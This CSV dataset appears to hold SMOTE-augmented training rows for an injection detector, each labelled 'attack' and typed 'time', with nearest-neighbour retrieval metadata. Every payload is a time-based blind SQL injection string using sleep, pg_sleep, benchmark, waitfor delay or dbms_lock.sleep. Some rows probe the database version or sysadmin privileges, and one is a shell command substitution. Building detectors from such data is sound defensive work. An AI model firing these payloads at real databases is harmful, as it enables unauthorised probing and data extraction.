id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000356,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,0.6561453835217859
SMOTE_000357,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.002883188109189087
SMOTE_000358,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,1.1564876808822306
SMOTE_000359,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.0798027037267104
SMOTE_000360,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,0.8129078657406313
SMOTE_000361,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,1.73733816632451
SMOTE_000362,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,1.3386610646111796
SMOTE_000363,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,2.2022305021105524
SMOTE_000364,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,0.43022409977264087
SMOTE_000365,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,0.6359278917271779
SMOTE_000366,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000107,0.6439365256847162
SMOTE_000367,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.37440334940366254
SMOTE_000368,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.35294626359572767
SMOTE_000369,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000214,0.7872007812682419
SMOTE_000370,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.6945348526886275
SMOTE_000371,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,0.44536429064885097
SMOTE_000372,attack,time,1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000168,0.19357721960460206
SMOTE_000373,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.3847784709968425
SMOTE_000374,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.22156284732898218
SMOTE_000375,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.07790885145228209
SMOTE_000376,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.768988218725818
SMOTE_000377,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.5729439083124055
SMOTE_000378,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,0.16616498224595266
SMOTE_000379,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,1.1159465125795898
SMOTE_000380,attack,time,select sleep  (  5  )   and 'gajm'  =  'gajm,nearest_attack_euclidean,R000207,0.8153594027464224
SMOTE_000381,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.4708009712995254
SMOTE_000382,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,1.243055107648392
SMOTE_000383,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,1.8038420057226046
SMOTE_000384,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R000167,0.3693688510437392
SMOTE_000385,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,0.12890373983864337
SMOTE_000386,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000252,1.115771620152917
SMOTE_000387,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000199,0.718715600823508
SMOTE_000388,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.553918902365349
SMOTE_000389,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",nearest_attack_euclidean,R000162,1.3878232485690523
SMOTE_000390,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,2.2355732461250883
SMOTE_000391,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,1.484452554671975
SMOTE_000392,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.47434073880193267
SMOTE_000393,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.7461325168364545
SMOTE_000394,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000258,1.9221814526279646
SMOTE_000395,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.39942046553648664
SMOTE_000396,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.352279839804462
SMOTE_000397,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.7485887791911493
SMOTE_000398,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,0.33177082567679134
SMOTE_000399,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,1.1439593906843304
SMOTE_000400,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.22840583519812635
SMOTE_000401,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.17626667423094822
SMOTE_000402,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.315206838568867
SMOTE_000403,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.3915162989966375
SMOTE_000404,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.43325221828428484
SMOTE_000405,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,1.2290669789931286
SMOTE_000406,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.3118787099238718
SMOTE_000407,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.3970935131290913
SMOTE_000408,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,0.38456333459257586
SMOTE_000409,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.10967904404363318
SMOTE_000410,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.19780400355610922
SMOTE_000411,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.4018463842769687
SMOTE_000412,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.03969866244520444
SMOTE_000413,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,0.6279819724663983
SMOTE_000414,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,0.06087570708690818
SMOTE_000415,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,0.6392140357381199
SMOTE_000416,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.04927264224246917
SMOTE_000417,attack,time,1'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000236,0.7821899112415824
SMOTE_000418,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.3997924333745932
SMOTE_000419,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.3305406436578978
SMOTE_000420,attack,time,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,nearest_attack_euclidean,R000195,1.1839696943994196
SMOTE_000421,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.6880405799205452
SMOTE_000422,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000191,0.24683694602615344
SMOTE_000423,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",nearest_attack_euclidean,R000145,0.35724931745905025
SMOTE_000424,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.9807366444957106
SMOTE_000425,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.9129971569102816
SMOTE_000426,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,nearest_attack_euclidean,R000225,0.21143292042236553
SMOTE_000427,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",nearest_attack_euclidean,R000278,1.286982438947401
SMOTE_000428,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.9049206795241691
SMOTE_000429,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.41799996977676335
SMOTE_000430,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.38881487870178316
SMOTE_000431,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,1.0205679923128983
SMOTE_000432,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,0.6965543667072125
SMOTE_000433,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.056143745137803396
SMOTE_000434,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000194,0.922348534911551
SMOTE_000435,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.5668141330862291
SMOTE_000436,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,1.0496496164894644
SMOTE_000437,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.2525607852072805
SMOTE_000438,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.02241442859799502
SMOTE_000439,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.19603329971226696
SMOTE_000440,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.004705733612418164
SMOTE_000441,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,1.5449558628534072
SMOTE_000442,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.16282300254261553
SMOTE_000443,attack,time,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000235,0.7044302726551673
SMOTE_000444,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.5238464956600403
SMOTE_000445,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,1.0590817183717236
SMOTE_000446,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,0.569722172757824
SMOTE_000447,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.052547728749336255
SMOTE_000448,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.6343569870991453
SMOTE_000449,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000297,1.4021276532862934
SMOTE_000450,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,0.44906095423505954
SMOTE_000451,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.3777741222339643
SMOTE_000452,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.547508324687746
SMOTE_000453,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.3377401542696087
SMOTE_000454,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.3033358778541881
SMOTE_000455,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",nearest_attack_euclidean,R000267,0.22133757348334862
SMOTE_000456,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.8061532271105689
SMOTE_000457,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.4443685904979187
SMOTE_000458,attack,time,1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000270,0.9258635919920006
SMOTE_000459,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,0.7719474422379862
SMOTE_000460,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000151,0.32503517384704866
SMOTE_000461,attack,time," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",nearest_attack_euclidean,R000232,0.5790853802223952
SMOTE_000462,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.06696895315082776
SMOTE_000463,attack,time,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000181,0.07249038243593371
SMOTE_000464,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000213,1.2682194103373752
SMOTE_000465,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,1.2225778545231372
SMOTE_000466,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000299,2.4000121563533163
SMOTE_000467,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000203,1.2231740241811129
SMOTE_000468,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,1.1249619028240745
SMOTE_000469,attack,time,1%' or sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000255,0.045678269105906874
SMOTE_000470,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,0.45348519469834375
SMOTE_000471,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000241,0.4828153528079142
SMOTE_000472,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,1.6013012524938601
SMOTE_000473,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.3684053408919614
SMOTE_000474,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.07528014399627321
SMOTE_000475,attack,time,1%' or sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000255,0.5585143662337367
SMOTE_000476,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000294,0.5787883854867449
SMOTE_000477,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.8392614988513883
SMOTE_000478,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,1.0252460228786366
SMOTE_000479,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.291722125292007
SMOTE_000480,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,2.264658909523673
SMOTE_000481,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,3.4072564282565296
SMOTE_000482,attack,time,1' and sleep  (  5  )   and 'usgv' like 'usgv,nearest_attack_euclidean,R000190,2.6686511173718285e-05
SMOTE_000483,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.9705758122727206
SMOTE_000484,attack,time,"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000292,0.2621126808905637
SMOTE_000485,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000241,0.39357111847772386
SMOTE_000486,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,1.8206672385365685
SMOTE_000487,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.5398921479846145
SMOTE_000488,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.6413875271985039
SMOTE_000489,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.5297427175632464
SMOTE_000490,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,0.6295615511898583
SMOTE_000491,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.2379987959397363
SMOTE_000492,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000289,0.37905592909148006
SMOTE_000493,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6396739245515743
SMOTE_000494,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.7731544793476441
SMOTE_000495,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.4129551141713015
SMOTE_000496,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.1364542497901962
SMOTE_000497,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,2.528067969343757
SMOTE_000498,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,0.927983658234545
SMOTE_000499,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",nearest_attack_euclidean,R000102,0.3372885709768235
SMOTE_000500,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000226,0.09490145095876737
